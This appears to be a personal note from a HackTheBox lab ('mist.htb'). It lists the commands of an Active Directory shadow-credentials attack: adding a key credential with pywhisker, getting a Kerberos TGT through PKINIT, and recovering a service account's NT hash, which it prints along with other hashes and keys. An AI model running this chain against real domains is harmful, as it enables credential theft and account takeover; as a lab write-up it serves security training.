## clean cred
proxychains4 python3 pywhisker.py --dc-ip 192.168.100.100 -u 'svc_ca$' -H :6db5b4f0e49cf6da4c937944d58c416b -t svc_cabackup  -a clear

## add shadow
proxychains4 python3 pywhisker.py --dc-ip 192.168.100.100 -u 'svc_ca$' -H :6db5b4f0e49cf6da4c937944d58c416b -t svc_cabackup  -a add --filename '/Users/esonhugh/workspace/Hackings/hackthebox_all/mist.htb/Computer-DC01/svc_ca$/target.pfx'

## get tgt
proxychains4 gettgtpkinit.py "mist.htb"/'svc_cabackup' 'ca_TGT.ccache' -dc-ip 192.168.100.100  -cert-pem  ./target.pfx_cert.pem -key-pem target.pfx_priv.pem 

## get nt hash
proxychains4 getnthash.py  -dc-ip 192.168.100.100 -debug mist.htb/'svc_cabackup' -key c490a6ebb7cd13dffe5a8423bb4fd2d8081bce92c1eead6d4b155fecc5db3d9c

## Recoverd NT hash

> c9872f1bc10bdd522c12fc2ac9041b64
